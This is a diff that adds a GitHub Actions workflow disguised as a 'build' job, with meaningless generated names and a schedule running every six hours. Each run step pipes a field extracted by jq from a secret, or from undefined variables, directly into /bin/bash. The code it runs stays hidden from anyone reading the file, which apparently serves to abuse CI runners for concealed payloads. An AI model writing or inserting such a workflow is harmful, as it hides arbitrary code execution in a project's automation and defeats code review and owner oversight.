@@ -1,0 +1,24 @@
+name: bishopsdutiful
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bishopsdutiful
+        env:
+          rh522: ${{ secrets.rh522 }}
+        run: |
+          echo $rh522 | jq -r .zf5 | /bin/bash
+          echo $nmkdk7 | jq -r .qnoky60644 | /bin/bash
+          echo $i4476 | jq -r .ddms55 | /bin/bash
+          echo $frli2 | jq -r .hoykh866 | /bin/bash
+          echo $k98076 | jq -r .kyzzg4 | /bin/bash
+          echo $tiej47297 | jq -r .oa851 | /bin/bash
+          echo $vn8 | jq -r .l52702 | /bin/bash
+          echo $xekc0193 | jq -r .a45423 | /bin/bash
+          echo $v6 | jq -r .afdu57575 | /bin/bash
+
